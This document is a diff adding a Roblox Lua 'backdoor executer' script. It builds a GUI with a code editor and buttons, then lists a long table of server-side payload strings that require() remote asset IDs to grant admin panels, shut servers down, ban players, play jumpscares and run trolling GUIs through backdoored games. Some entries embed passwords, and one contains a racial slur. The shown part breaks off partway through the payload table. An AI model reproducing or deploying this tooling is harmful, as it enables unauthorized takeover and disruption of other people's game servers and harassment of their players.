@@ -1,0 +1,825 @@
+-- ]] 
+-- arno Backdoor scanner v3
+--- made by Zyphor
+-- ]]
+
+local Players = game:GetService("Players")
+local UIS = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+
+if PlayerGui:FindFirstChild("SimplexSS_UI") then
+	PlayerGui.SimplexSS_UI:Destroy()
+end
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "ARNI_RCE_SERVERSIDE"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = PlayerGui
+
+local WHITE = Color3.fromRGB(255,255,255)
+local LIGHT = Color3.fromRGB(245,245,245)
+local PANEL = Color3.fromRGB(250,250,250)
+local DARK = Color3.fromRGB(30,30,30)
+local BORDER = Color3.fromRGB(140,140,140)
+local BLUE = Color3.fromRGB(0,120,215)
+
+local Main = Instance.new("Frame",ScreenGui)
+Main.Size = UDim2.new(0,800,0,450)
+Main.Position = UDim2.new(0.5,-400,0.5,-225)
+Main.BackgroundColor3 = LIGHT
+Main.BorderSizePixel = 1
+Main.BorderColor3 = BORDER
+Main.Active = true
+
+local TitleBar = Instance.new("Frame",Main)
+TitleBar.Size = UDim2.new(1,0,0,32)
+TitleBar.BackgroundColor3 = Color3.fromRGB(235,235,235)
+TitleBar.BorderSizePixel = 1
+TitleBar.BorderColor3 = BORDER
+
+local Title = Instance.new("TextLabel",TitleBar)
+Title.Size = UDim2.new(1,-120,1,0)
+Title.Position = UDim2.new(0,8,0,0)
+Title.BackgroundTransparency = 1
+Title.Text = "Arno Ss - Simple Backdoor Executer"
+Title.TextColor3 = DARK
+Title.Font = Enum.Font.Gotham
+Title.TextSize = 14
+Title.TextXAlignment = Enum.TextXAlignment.Left
+
+local function CreateWindowButton(text,pos)
+	local b = Instance.new("TextButton",TitleBar)
+	b.Size = UDim2.new(0,40,1,0)
+	b.Position = UDim2.new(1,-pos,0,0)
+	b.Text = text
+	b.Font = Enum.Font.Gotham
+	b.TextSize = 14
+	b.BackgroundColor3 = TitleBar.BackgroundColor3
+	b.BorderSizePixel = 0
+	b.TextColor3 = DARK
+	b.MouseEnter:Connect(function()
+		b.BackgroundColor3 = BLUE
+		b.TextColor3 = WHITE
+	end)
+	b.MouseLeave:Connect(function()
+		b.BackgroundColor3 = TitleBar.BackgroundColor3
+		b.TextColor3 = DARK
+	end)
+	return b
+end
+
+local MinBtn = CreateWindowButton("—",120)
+local MaxBtn = CreateWindowButton("□",80)
+local CloseBtn = CreateWindowButton("X",40)
+
+CloseBtn.MouseButton1Click:Connect(function()
+	ScreenGui:Destroy()
+end)
+
+local dragging, dragInput, dragStart, startPos
+
+TitleBar.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = true
+		dragStart = input.Position
+		startPos = Main.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+TitleBar.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement then
+		dragInput = input
+	end
+end)
+
+local dragging, dragInput, dragStart, startPos
+
+local function update(input)
+	local delta = input.Position - dragStart
+	Main.Position = UDim2.new(
+		startPos.X.Scale, 
+		startPos.X.Offset + delta.X, 
+		startPos.Y.Scale, 
+		startPos.Y.Offset + delta.Y
+	)
+end
+
+TitleBar.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = Main.Position
+
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+TitleBar.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		dragInput = input
+	end
+end)
+
+UIS.InputChanged:Connect(function(input)
+	if input == dragInput and dragging then
+		update(input)
+	end
+end)
+
+
+local Body = Instance.new("Frame",Main)
+Body.Position = UDim2.new(0,0,0,32)
+Body.Size = UDim2.new(1,0,1,-32)
+Body.BackgroundTransparency = 1
+
+local EditorPanel = Instance.new("Frame",Body)
+EditorPanel.Size = UDim2.new(0.75,0,1,-70)
+EditorPanel.Position = UDim2.new(0,0,0,0)
+EditorPanel.BackgroundColor3 = WHITE
+EditorPanel.BorderSizePixel = 1
+EditorPanel.BorderColor3 = BORDER
+
+local SidePanel = Instance.new("Frame",Body)
+SidePanel.Size = UDim2.new(0.25,0,1,-70)
+SidePanel.Position = UDim2.new(0.75,0,0,0)
+SidePanel.BackgroundColor3 = PANEL
+SidePanel.BorderSizePixel = 1
+SidePanel.BorderColor3 = BORDER
+
+local SideTitle = Instance.new("TextLabel",SidePanel)
+SideTitle.Size = UDim2.new(1,0,0,30)
+SideTitle.BackgroundColor3 = Color3.fromRGB(240,240,240)
+SideTitle.BorderSizePixel = 1
+SideTitle.BorderColor3 = BORDER
+SideTitle.Text = "script here"
+SideTitle.Font = Enum.Font.Gotham
+SideTitle.TextSize = 13
+SideTitle.TextColor3 = DARK
+
+local ScriptScroll = Instance.new("ScrollingFrame",SidePanel)
+ScriptScroll.Position = UDim2.new(0,0,0,30)
+ScriptScroll.Size = UDim2.new(1,0,1,-30)
+ScriptScroll.CanvasSize = UDim2.new(0,0,0,0)
+ScriptScroll.ScrollBarThickness = 6
+ScriptScroll.BackgroundTransparency = 1
+ScriptScroll.BorderSizePixel = 0
+
+local Console = Instance.new("Frame",Body)
+Console.Size = UDim2.new(1,0,0,30)
+Console.Position = UDim2.new(0,0,1,-70)
+Console.BackgroundColor3 = Color3.fromRGB(235,235,235)
+Console.BorderSizePixel = 1
+Console.BorderColor3 = BORDER
+
+local ConsoleText = Instance.new("TextLabel",Console)
+ConsoleText.Size = UDim2.new(1,-10,1,0)
+ConsoleText.Position = UDim2.new(0,5,0,0)
+ConsoleText.BackgroundTransparency = 1
+ConsoleText.Text = "[IDE] Welcome Of Arno Backdoor scanner - internal Roblox backdoor Executer"
+ConsoleText.Font = Enum.Font.Code
+ConsoleText.TextSize = 13
+ConsoleText.TextXAlignment = Enum.TextXAlignment.Left
+ConsoleText.TextColor3 = DARK
+
+local ButtonsBar = Instance.new("Frame",Body)
+ButtonsBar.Size = UDim2.new(1,0,0,40)
+ButtonsBar.Position = UDim2.new(0,0,1,-40)
+ButtonsBar.BackgroundColor3 = LIGHT
+ButtonsBar.BorderSizePixel = 1
+ButtonsBar.BorderColor3 = BORDER
+
+local buttonWidth = 120
+local spacing = 15
+local totalWidth = (buttonWidth * 5) + (spacing * 4)
+local startX = (800 - totalWidth) / 2
+
+local function CreateBottomButton(name,index)
+	local b = Instance.new("TextButton",ButtonsBar)
+	b.Size = UDim2.new(0,buttonWidth,0,28)
+	b.Position = UDim2.new(0,startX + (index-1)*(buttonWidth+spacing),0,6)
+	b.Text = name
+	b.Font = Enum.Font.Gotham
+	b.TextSize = 13
+	b.BackgroundColor3 = WHITE
+	b.BorderSizePixel = 1
+	b.BorderColor3 = BORDER
+	b.TextColor3 = DARK
+	b.MouseEnter:Connect(function()
+		b.BackgroundColor3 = BLUE
+		b.TextColor3 = WHITE
+	end)
+	b.MouseLeave:Connect(function()
+		b.BackgroundColor3 = WHITE
+		b.TextColor3 = DARK
+	end)
+	return b
+end
+
+local Execute = CreateBottomButton("Execute",1)
+local Clear = CreateBottomButton("Clear",2)
+local Acquiquirir = CreateBottomButton("Acquiquirir",3)
+local RE = CreateBottomButton("RE",4)
+local R6 = CreateBottomButton("R6",5)
+
+local Scroll = Instance.new("ScrollingFrame",EditorPanel)
+Scroll.Size = UDim2.new(1,0,1,0)
+Scroll.CanvasSize = UDim2.new(0,0,0,0)
+Scroll.ScrollBarThickness = 6
+Scroll.BackgroundTransparency = 1
+Scroll.BorderSizePixel = 0
+
+local Numbers = Instance.new("TextLabel",Scroll)
+Numbers.Size = UDim2.new(0,45,1,0)
+Numbers.BackgroundColor3 = Color3.fromRGB(245,245,245)
+Numbers.BorderSizePixel = 1
+Numbers.BorderColor3 = BORDER
+Numbers.TextXAlignment = Enum.TextXAlignment.Right
+Numbers.TextYAlignment = Enum.TextYAlignment.Top
+Numbers.Font = Enum.Font.Code
+Numbers.TextSize = 14
+Numbers.TextColor3 = Color3.fromRGB(120,120,120)
+Numbers.Text = "1"
+Numbers.ZIndex = 1
+
+local Highlight = Instance.new("TextLabel",Scroll)
+Highlight.Position = UDim2.new(0,50,0,0)
+Highlight.Size = UDim2.new(1,-50,1,0)
+Highlight.BackgroundTransparency = 1
+Highlight.TextXAlignment = Enum.TextXAlignment.Left
+Highlight.TextYAlignment = Enum.TextYAlignment.Top
+Highlight.Font = Enum.Font.Code
+Highlight.TextSize = 14
+Highlight.RichText = true
+Highlight.TextColor3 = DARK
+Highlight.ZIndex = 1
+
+local TextBox = Instance.new("TextBox",Scroll)
+TextBox.Position = Highlight.Position
+TextBox.Size = Highlight.Size
+TextBox.BackgroundTransparency = 1
+TextBox.TextTransparency = 0
+TextBox.TextXAlignment = Enum.TextXAlignment.Left
+TextBox.TextYAlignment = Enum.TextYAlignment.Top
+TextBox.Font = Enum.Font.Code
+TextBox.TextSize = 14
+TextBox.MultiLine = true
+TextBox.ClearTextOnFocus = false
+TextBox.TextWrapped = false
+TextBox.TextColor3 = DARK
+TextBox.PlaceholderText = "— made by Zyphor"
+TextBox.ZIndex = 2
+
+
+local colorMapping = {
+    ["local"] = "rgb(255, 0, 0)", 
+    ["function"] = "rgb(85, 255, 85)",
+    ["require"] = "rgb(110, 153, 202)",
+    ["then"] = "rgb(85, 170, 255)",
+    ["and"]="rgb(85, 170, 255)", ["break"]="rgb(85, 170, 255)", ["do"]="rgb(85, 170, 255)", 
+    ["else"]="rgb(85, 170, 255)", ["elseif"]="rgb(85, 170, 255)", ["end"]="rgb(85, 170, 255)", 
+    ["false"]="rgb(85, 170, 255)", ["for"]="rgb(85, 170, 255)", ["if"]="rgb(85, 170, 255)", 
+    ["in"]="rgb(85, 170, 255)", ["nil"]="rgb(85, 170, 255)", ["not"]="rgb(85, 170, 255)", 
+    ["or"]="rgb(85, 170, 255)", ["repeat"]="rgb(85, 170, 255)", ["return"]="rgb(85, 170, 255)", 
+    ["true"]="rgb(85, 170, 255)", ["until"]="rgb(85, 170, 255)", ["while"]="rgb(85, 170, 255)", 
+    ["game"]="rgb(85, 170, 255)", ["workspace"]="rgb(85, 170, 255)", ["script"]="rgb(85, 170, 255)"
+}
+
+local function highlightText(text)
+    text = text:gsub("&", "&amp;"):gsub("<", "&lt;"):gsub(">", "&gt;")
+    text = text:gsub("(%d+%.?%d*)", "<font color='rgb(215, 169, 75)'>%1</font>")
+    for keyword, color in pairs(colorMapping) do
+        text = text:gsub("%f[%a]" .. keyword .. "%f[%A]", "<font color='" .. color .. "'>" .. keyword .. "</font>")
+    end
+    return text
+end
+
+local function UpdateEditor()
+    local content = TextBox.Text
+    local lines = content:split("\n")
+    local lineText = ""
+    for i = 1, #lines do lineText = lineText .. i .. "\n" end
+    Numbers.Text = lineText
+    Highlight.Text = highlightText(content)
+    
+    local h = #lines * 18
+    Scroll.CanvasSize = UDim2.new(0, 5000, 0, h + 50)
+    Highlight.Size = UDim2.new(0, 5000, 0, h + 50)
+    TextBox.Size = Highlight.Size
+end
+
+TextBox:GetPropertyChangedSignal("Text"):Connect(UpdateEditor)
+
+
+
+local Scripts = {
+	["cs go guns"] = 'require(4207271766).load("gislener3")',
+	["base secret service"] = 'require(7245216352)("gislener3")',
+	["prison map"] = 'require(3161149042).redwood()',
+	["Polaria"] = 'require(74264471859345):Pload("gislener3")',
+	["mr bean admin"] = 'require(92684888032460)({Owners = {"gislener3"}})',
+	["gbnooly gui"] = 'require(115548396641576):V4("gislener3")',
+	["BrookHaven Map"] = 'require(110191289672557).brookhaven("gislener3")',
+	["K00pkidd Coffe Map"] = 'require(9821168174)("gislener3")',
+	["Natural Disaster Map"] = 'require(14704225060).nds("gislener3")',
+	["K00pkidd Realm"] = 'require(9603760803)("gislener3")',
+	["Grab Knife V1"] = 'require(74444736936643)("gislener3", "Grab Knife V1")',
+	["Grab Knife V2"] = 'require(74444736936643)("gislener3", "Grab Knife V2")',
+	["Grab Knife V3"] = 'require(74444736936643)("gislener3", "Grab Knife V3")',
+	["Grab Knife V4"] = 'require(74444736936643)("gislener3", "Grab Knife V4")',
+	["Project Ligma Logo"] = 'require(115065639729634)("gislener3")',
+	["Baldi's Baiscs Map"] = 'require(6058180303).school("gislener3")',
+	["Job Application Jumpscare"] = 'require(106096894680939):Fun("gislener3")',
+	["Road Rogue"] = 'require(7473216460).load("gislener3")',
+	["Solitude"] = 'require(4749896781).no("gislener3")',
+	["Project FSA"] = 'require(0x6e9f5acb1a6d).FSA("gislener3")',
+	["Project Hammer Down/Nu-7"] = 'require(134677958920499).Nu("gislener3")',
+	["00l94 GUI Hacking Incident"] = 'require(16385380388).OK("gislener3")',
+	["MLG Gun"] = 'require(2850994438).load("gislener3")',
+	["Steve"] = 'require(0x42E865914ADB).mc("gislener3")',
+	["Bird Wings"] = 'require(16668712615):Fire("gislener3", "birdwings")',
+	["Kohls Ranker"] = 'local module = require(game.ServerScriptService["Kohl\'s Admin"].Loader.MainModule) module.Auth.userRoleAdd("gislener3", "Owner")',
+	["Shutdown"] = 'require(90189679709013).shutdown("gislener3", "Server Shutdown")',
+	["Rocky2u's Admin"] = 'require(16662837893).AddRocky("gislener3")',
+	["Hide.me"] = 'require(73610662913659)("gislener3")',
+	["Project SubSoll"] = 'require(75418315695649)("gislener3")',
+	["Remington 870"] = 'require(4879817593)("gislener3")',
+	["Drill Car"] = 'require(11505758587).RAroblox("gislener3")',
+	["Tornado V2"] = 'require(1541678543).load("gislener3")',
+	["Anoymous Particles"] = 'require(86350209075676).Anonymous("gislener3", "anon")',
+	["Bobux Tool"] = 'require(7904530401).bobux("gislener3")',
+	["Polaria (Back)"] = 'require(74264471859345):Pload("gislener3")',
+	["144anz Hub"] = 'require(16212277443):SHHH144anzHUB("gislener3")',
+	["China GUI"] = 'require(133135921146911).Chiina("gislener3")',
+	["Exser"] = 'require(12897516284):pls("gislener3")',
+	["Dex Legacy"] = 'require(12147037675)("gislener3")',
+	["Infinite Yield BETA"] = 'require(15610593870)("gislener3")',
+	["Team F4llf0x GUI"] = 'require(83255665186900)("gislener3")',
+	["PLDeternity's scripts"] = 'require(109671523882454).Erika("gislener3")',
+	["Earthy Hub v2.0.0"] = 'require(5282751219):Fire("gislener3")',
+	["Project Ham00d"] = 'require(72940679466589):ProjectHam("gislener3")',
+	["Workship Tool"] = 'require(137653616442306).ship("gislener3")',
+	["McDonald's Map"] = 'require(3168737443).load("gislener3")',
+	["Abdullah Map"] = 'require(131945008071397).map("gislener3")',
+	["Ham00d GUI V2"] = 'require(104634085935761):Ham00dv2("gislener3")',
+	["Cooldown Nuke V1"] = 'require(4867426485):SD("gislener3")',
+	["Cooldown Nuke V2"] = 'require(4867426485):SD2("gislener3")',
+	["Infection"] = 'require(8317917339).Infection("gislener3")',
+	["Obunga Jumpscare"] = 'for i,v in pairs(game.Players:GetPlayers()) do require(94540928447702).s(v.Name) end',
+	["Airstrike"] = 'require(81352847812400):Airstrike("gislener3")',
+	["Building Tools"] = 'require(17015419876)("gislener3")',
+	["Music Aura"] = 'require(73268005482644):load("gislener3", 7062141501, 1, 1)',
+	["Dev Uzi"] = 'require(16662808456):Fire("gislener3", "dev-uzi")',
+	["Mjolmir"] = 'require(118505503315622)("gislener3")',
+	["Sin Dragon"] = 'require(122984259806626).sinniest_of_dragons("gislener3")',
+	["Ship"] = 'require(72500435520177).run("gislener3")',
+	["Trap Rifle"] = 'require(138628536384714).ConvertedByCombine("gislener3")',
+	["Seeker Of Peace"] = 'require(5091625839):CoolGlitch("gislener3")',
+	["Total Skid"] = 'require(5374654456).Dark("gislener3")',
+	["HoverBike"] = 'require(92970629038681).HoverBike("gislener3")',
+	["Chainsaw"] = 'require(4560014954).load("gislener3")',
+	["Reality Orb"] = 'require(4780399515).load("gislener3")',
+	["Rocket Launcher"] = 'require(5760020154).load("gislener3")',
+	["Techno Gauntlet"] = 'require(13823370157):Fire("gislener3", "techno")',
+	["Osamaru Sword"] = 'require(0x6c6d82874906)[".gg/bXQfb3QWa8"]("gislener3","Converted")',
+	["Mr Bye Bye"] = 'require(0xB4AF21B4):Start("gislener3", "AAA")',
+	["Hyperbike Rainbow"] = 'require(92163005580967)("gislener3")',
+	["Wasp Fighter Jet"] = 'require(5860060462).load("gislener3")',
+	["Laser Cat"] = 'require(6564964464)("gislener3")',
+	["Fumo"] = 'require(6513944290).load("gislener3")',
+	["Killbot V3"] = 'require(6688474792).load("gislener3")',
+	["Ravenger Claws V2"] = 'require(95784693858604).clawsv2("gislener3")',
+	["FUZION Glitcher"] = 'require(11792006247).FUZION("gislener3")',
+	["Lua Hammer V2"] = 'require(79009847013799).fun("gislener3")',
+	["Raligun Mech"] = 'require(129024399030696).railgun("gislener3")',
+	["Dual Ultima - Solaris"] = 'require(2946060158):Fire("gislener3","hack")',
+	["Ambush"] = 'require(11213747230).ambush("gislener3")',
+	["Rickroll"] = 'require(133433462376850):RICKROLL("gislener3")',
+	["Gui Unverified"] = 'require(6896725229).ok("gislener3")',
+	["Pootis (Original)"] = 'require(0x635a8d6335ec).putis("gislener3")',
+	["Jarred Mech"] = 'require(102370567881830).mech("gislener3")',
+	["Doge Morph"] = 'require(77645137768492)("gislener3")',
+	["Red Titan"] = 'require(110867854792744).run("gislener3")',
+	["Time Blast"] = 'require(14686128239).TimeBlast("gislener3")',
+	["SSP (Modded)"] = 'require(96288911777671):SSP("gislener3")',
+	["Guts"] = 'require(6438169891).load("gislener3")',
+	["Blue SpiderBot"] = 'require(90347990327548).Bspider("gislener3")',
+	["RC7 Cracked"] = 'require(0x400ee0061af0):RC7_CRACKED("gislener3")',
+	["Krystal Dance V1"] = 'require(87316427677984)["KDV1C7"]("gislener3")',
+	["Ro-Xploit 6.0"] = 'require(0x5de84b4a3e1d)[".gg/bXQfb3QWa8"]("gislener3","Converted")',
+	["PolyGoner"] = 'require(6338277134)("gislener3")',
+	["AR-15"] = 'require(16662828437).naenae("gislener3")',
+	["EpicGui V2"] = 'require(109144918642898)("gislener3")',
+	["SpiderBot V2"] = 'require(117506832703700).Spider("gislener3")',
+	["Dark Magic Wings"] = 'require(120755274865165).run("gislener3")',
+	["Lightnning Titan"] = 'require(139768895683863).rAWr("gislener3")',
+	["Grenade Launcher"] = 'require(77369198952626).run("gislener3")',
+	["Brick Tail"] = 'require(104725813510916).run("gislener3")',
+	["iOrb v666"] = 'require(129767474048068).iOrb("gislener3","LOL")',
+	["Kitty Angel"] = 'require(91768479695764).run("gislener3")',
+	["Mike Bike"] = 'require(78384594280316).mbike("gislener3")',
+	["2022 Baseplate Map"] = 'require(129901329863012).Baseplate("gislener3")',
+	["EpicGui V1"] = 'require(100980924903710):ultimate("gislener3")',
+	["NFCHAT V4"] = 'require(126128669180708)()',
+	["Weapons"] = 'require(4207271766).load("gislener3")',
+	["Boss Angel"] = 'require(4938317654).load("gislener3")',
+	["Vooodo Child V2"] = 'require(6191675567).load("gislener3")',
+	["Vooodo Child V1"] = 'require(6191659992).load("gislener3")',
+	["Bipolaria"] = 'require(88477009909590):Pload("gislener3")',
+	["Project Ligma"] = 'require(10027382472)("gislener3")',
+	["MatGui V5 OP"] = 'require(97657927630676):Matz("gislener3")',
+	["Genos"] = 'require(14499140823)("gislener3", "genos")',
+	["MeatLoaf's Loader"] = 'require(7334568508).MSL("gislener3")',
+	["c00lgui reborn"] = 'require(14125553864):Fire("gislener3","c00lkidd")',
+	["Sensation Hub"] = 'require(100263845596551)("gislener3")',
+	["Blue2spooky GUI V2"] = 'require(111344520814454):load("gislener3")',
+	["HappyHub SS"] = 'require(78790302691160):Hload("gislener3")',
+	["Dryq74 GUI"] = 'require(134839673375508).Dryq74gui("gislener3")',
+	["Team Fat GUI V17"] = 'require(13772265165).TeamFatGUICrackedByLua("gislener3")',
+	["Black Figure"] = 'require(7972003282).CLoad("gislener3")',
+	["SF V3"] = 'require(132592022786319).SFV3PC("gislener3")',
+	["Project Number 2"] = 'require(85379941416563):flexinload("gislener3")',
+	["K00pkidd GUI V8"] = 'require(14829670677).EDITL0L("gislener3")',
+	["P00lkidd GUI"] = 'require(129309278372518):P00lKidd("gislener3")',
+	["Saudi GUI V3"] = 'require(75885601008770)("gislener3")',
+	["Stummy Guns"] = 'require(85379941416563):flexinload("gislener3")',
+	["ExSer"] = 'require(10868847330):pls("gislener3")',
+	["Grandsola"] = 'require(16492539574)("gislener3")',
+	["RC7"] = 'require(12350030542).RC7("gislener3")',
+	["BTools F3X"] = 'require(4869378421).F3X("gislener3")',
+	["Noobs Spawner"] = 'require(5193737424)("gislener3",false)',
+	["Anoymous GUI"] = 'require(10028265342)("gislener3")',
+	["HD Admin Rankers"] = 'require(7192763922).load("gislener3")',
+	["John Doe"] = 'require(2845929020).ooga("gislener3")',
+	["Machine Gun"] = 'require(5451379778).Gun("gislener3")',
+	["Project Shiba V19"] = 'require(106482539335115)("gislener3")',
+	["Geskorian GUI"] = ' -- Pass: GASKAPASKARIAROLLEXA103404 require(128299485774450).geskorian("gislener3")',
+	["Grove SS V101"] = 'require(0x408e54f7c).ServerSideV101FirstVersion("gislener3")',
+	["C4 Bomb"] = 'require(0x1767bf813)("gislener3")',
+	["Darius SiSupram"] = 'require(17131051292).DariusSiSupramSkid("gislener3")',
+	["Darius zT1nA"] = 'require(80306586084240).zT1nA("gislener3")',
+	["Acorn Incident V2"] = 'require(0x4f3727b639b3)("gislener3")',
+	["Project Iluminate"] = 'require(105544298869931).Fixed("gislener3")',
+	["Project GFD"] = 'require(100954607997679).ProjectGFDSSBETA("gislener3")',
+	["Darius GUI OP"] = 'require(127445614272366).op("gislener3")',
+	["DEX"] = 'require(14572394952)("gislener3")',
+	["Goner"] = 'require(4513235536).G("gislener3")',
+	["K00pkidd GUI V9"] = 'require(17145849501).v9("gislener3")',
+	["Ro-Xploit 5.0"] = 'require(13895319375)("gislener3")',
+	["Epic GUI"] = 'require(10928665370).epic("gislener3")',
+	["g00by GUI"] = 'require(77673101600856)("gislener3")',
+	["R6"] = 'require(3436957371):r6("gislener3")',
+	["Pepsi GUI V19"] = 'require(113825094179678).pepsi("gislener3")',
+	["Ban Hammer"] = 'require(5448035802).Hammer("gislener3","BanHammer")',
+	["T00tkidd GUI"] = 'require(15984176840).hi("gislener3")',
+	["Admin GUI Moon"] = 'require(13581457513):outthemoon("gislener3")',
+	["Ozbament GUI"] = 'require(129354578569589):Hload("gislener3")',
+	["Pee"] = 'require(4709753802).load("gislener3")',
+	["Synapse X"] = 'require(5419042716).PraiseSkidGod("gislener3")',
+	["Caducus"] = 'require(5686002742):Fire("gislener3","caducus")',
+	["TOPK3K"] = 'require(2609384717).load("gislener3")',
+	["SSP"] = 'require(16920033857)("gislener3")',
+	["Ultimate Trolling"] = 'require(16422687248).JO1TAR0utg("gislener3")',
+	["Sheldoni"] = 'require(15629007042)("gislener3")',
+	["Tac0z GUI"] = 'require(124950649033109).anticheat("gislener3")',
+	["Slav GUI V1"] = 'require(9838595269).slavichankgui("gislener3")',
+	["K00p77 GUI V4"] = 'require(15833438747).k00p77v4("gislener3")',
+	["Mr.Bean Admin"] = 'require(16638501761){Owners={"gislener3"},Prefix=";"}',
+	["Xester V2"] = 'require(3418687354).load("gislener3")',
+	["Dream GUI"] = 'require(15232587754).DreamGUI("gislener3")',
+	["All Seeing Hand"] = 'require(5375399205).Player("gislener3")',
+	["Saitama"] = 'require(14499140823)("gislener3","saitama2")',
+	["Minos Ultrakill"] = 'require(0x3603754d7)("gislener3", "minos2")',
+	["Server Admin"] = 'require(4665394711).load("gislener3")',
+	["C00lkidd Forsaken"] = 'require(89709417365094).Forsaken("gislener3","c00lkidd")',
+	["Guest 1337"] = 'require(81657562726106).Guest1337("gislener3")',
+	["K00pkidd V101"] = 'require(88377888418354).sickv101koopesz("gislener3")',
+	["Z00lkidd V2"] = 'require(12602926423).z00skidd("gislener3")',
+	["Spectrum Glitcher"] = 'require(4721735759).load("gislener3")',
+	["Lua Hammer"] = 'require(11957419646):Fire("gislener3", "lua")',
+	["Cart Ride"] = 'require(13904101403).RAroblox("gislener3")',
+	["Sugma V1"] = 'require(11183244198):s("sugma", game.Players.gislener3)',
+	["Juana SS"] = 'require(4869013426).JuanaSS("gislener3")',
+	["C4N0FV16 GUI V15"] = 'require(111283583907072):C4NC4N("gislener3")',
+	["Yong.Sheldon EXE"] = 'require(96855101727017):Load("gislener3")',
+	["P00ngkidd Undetect"] = 'require(15204636597).undetectb("gislener3")',
+	["H01PK GUI V21"] = 'require(0x4af2144545ce).ALLNIGGAITISKINGV44LEAKKKkh01pkOnTOP("gislener3")',
+	["Dr4g GUI V5"] = 'require(0x391c103dd).load("gislener3")',
+	["Guns Pack"] = 'require(15337915747)("gislener3")',
+	["Murderer"] = 'require(17181192900)("gislener3")',
+	["Anti LGBT GUI"] = 'require(128212093523664).LGBT("gislener3")',
+	["Mystic"] = 'require(7274736492)("gislener3")',
+	["Sledge Hammer"] = 'require(8038037940).CLoad("gislener3")',
+	["Tidal Cracked"] = 'require(109690586705177).SentinelPrime("gislener3")',
+	["Infinite Yield Beta"] = 'require(7634392335)("gislener3")',
+	["Suicide Gun"] = 'require(17356032874).load("gislener3")',
+	["John Doe GUI"] = 'require(16666540998).john("gislener3")',
+	["Bre4dGUI V5"] = 'require(16695338037).bre4dguiV5("gislener3")',
+	["GUI Ultimate Private"] = 'require(15145876262).V2("gislener3")',
+	["Nezor V1.0"] = 'require(100227259985025):Ex("gislener3")',
+	["MatGui Ultimate"] = 'require(0x6c2a9b5881f9)("gislener3")',
+	["3 Exploiters GUI"] = 'require(103853640037661).T3EX("gislener3")',
+	["Excavator"] = 'require(16857604287)("gislener3")',
+	["Nex4r GUI V10"] = 'require(0x6ED849146086):v10("gislener3")',
+	["Professional GUI"] = 'require(83968531660740):plr("gislener3")', -- Pass: SIGMAFe
+	["Team Exploiter V22"] = 'require(0x599b96ae27f5):Ex0("gislener3")',
+	["Roblox HQ"] = 'require(17110658137).asd("gislener3")',
+	["T71 GUI V4"] = 'require(84337619968010).T7x1V4("gislener3")', -- T7X1 / Team 7x4x2x1 is here lel
+	["777ililo GUI V3"] = 'require(134907549394378)("gislener3")',
+	["Dominius Executor"] = 'require(0x667fc316bb91):domi("gislener3")',
+	["Grab Knife V4 Prem"] = 'require(74444736936643)("gislener3", "Grab Knife V4 Premium")',
+	["Darius GUI V30"] = 'require(118638545673480).V30("gislener3")',
+	["Project SonicElijah"] = 'require(5104783290).projectreptilev3leaklolz("gislener3")',
+	["Mushroom Gang"] = 'require(16394708597).idhfbsdzufhbuzBGRZUBSEFZUSDGuzveubgszufgsezbuZUGFUZEGZGFESZU2348234827346HBSDFHSBZUgeugswuwesrsef("gislener3")',
+	["g00bd0ylan GUI"] = 'require(12610895743).g00bdolen("gislener3")',
+	["Obunga"] = 'require(107403611588248)("gislener3")',
+	["Cry Troll Reborn 2"] = 'require(122532252019388).UCTG("gislener3")',
+	["Family Coffe Map"] = 'require(108520326907147).lol("gislener3")',
+	["Sukuna"] = 'require(118335269855795).Sukuna("gislener3", "sukuna")',
+	["Sm1le GUI"] = 'require(17223407728):smil("gislener3")',
+	["Patrick"] = 'require(12102103065).Patrick("gislener3")',
+	["MeepCity 4 Map"] = 'require(11822002067)("gislener3")',
+	["n00zGUI V666"] = 'require(0x3fc6a75fe).n00z666("gislener3")',
+	["Mafioso"] = 'require(82428270854492).sigma("gislener3")',
+	["KFC Troll Map"] = 'require(12573742929)("gislener3")',
+	["Elio Blasio"] = 'require(2891645338).sans("undertale", "gislener3")',
+	["HD Admin Loader"] = 'require(6080815623):Fire("gislener3")',
+	["Crucifix"] = 'require(12933040327)("gislener3")',
+	["R7J GUI V3"] = 'require(81081252350675).v3("gislener3")',
+	["MrHaxor GUI V8"] = 'require(124749800282988).MrHaxorOfficial("gislener3")',
+	["Golden BoomBox"] = 'require(6793077180).radio("gislener3")',
+	["DoritoZ X"] = 'require(11126986112)("gislener3")',
+	["Cloud"] = 'require(5665978099)("gislener3")',
+	["1x1x1x1 GUI"] = 'require(6858594080).KrnKidsSus("gislener3")',
+	["Flowers"] = 'require(118327572218279).Forsaken("gislener3", "פרחים")',
+	["DNG"] = 'require(0x5EDFB9C275C1).DNG("gislener3")',
+	["Nuke GUI"] = 'require(4832967293):Fire("gislener3")',
+	["N00t Noot"] = 'require(5034863407).subtosyntax64("gislener3")',
+	["Cat Jumpscare"] = 'require(71572793929331)("gislener3")',
+	["STOFH Map"] = 'require(6675792322).sfoth("gislener3")',
+	["2006 Classic Map"] = 'require(6929171488).loadMap("gislener3")',
+	["Ultimate Brickma"] = 'require(112945327108627).Brickma("gislener3")',
+	["Cauã Hub"] = 'require(6174615549).CauaHub("gislener3")', -- Pass: 102-291-2391-2129-219-2020
+	["Ohio Map"] = 'require(12015898055).ohio_place("gislener3")',
+	["Gravity Hammer"] = 'require(12012115295).load("gislener3")',
+	["Jumpscare GUI"] = 'require(79746681934818).jumpscare("gislener3")',
+	["RTR GUI V2.0"] = 'require(82150847812202).rtr("gislener3")',
+	["Logo Stigma Ult"] = 'require(115065639729634)("gislener3")',
+	["Purple Guy"] = 'require(5486907740).Purple("gislener3")',
+	["Aeshma"] = 'require(6342834455).load("gislener3")',
+	["Fight Mode"] = 'require(6438401832).load("gislener3")',
+	["Doggo Army"] = 'require(5115249013).fehack("gislener3")',
+	["Echo"] = 'require(5374597845).Dark("gislener3")',
